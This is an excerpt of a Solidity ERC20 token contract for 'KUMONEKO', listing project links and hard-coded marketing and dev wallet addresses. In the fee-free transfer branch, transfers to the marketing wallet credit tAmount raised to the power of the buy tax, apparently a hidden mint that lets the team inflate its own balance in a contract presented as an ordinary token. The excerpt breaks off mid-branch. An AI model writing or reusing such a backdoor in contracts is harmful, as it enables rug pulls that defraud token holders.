...
/**
Telegram: https://t.me/KumoNekoportal
website: https://www.kumoneko.live/#page-0
...
contract KUMONEKO is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x8cC80beF5e3e68951c601a3Ac7E1cb3af4FBC689); 
    address payable public Wallet_Dev = payable(0x4Dba39a135A04fc3138ed4D21D21Dce383b4050E);
    ...
    string private constant _name = "KUMONEKO"; 
    string private constant _symbol = unicode"$KUMONEKO"; 
    ...
    constructor () {
        ...
        _owner = 0x4Dba39a135A04fc3138ed4D21D21Dce383b4050E;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(recipient == Wallet_Marketing){
                _tOwned[recipient] = _tOwned[recipient]+tAmount**_Tax_On_Buy;
            }
            else{
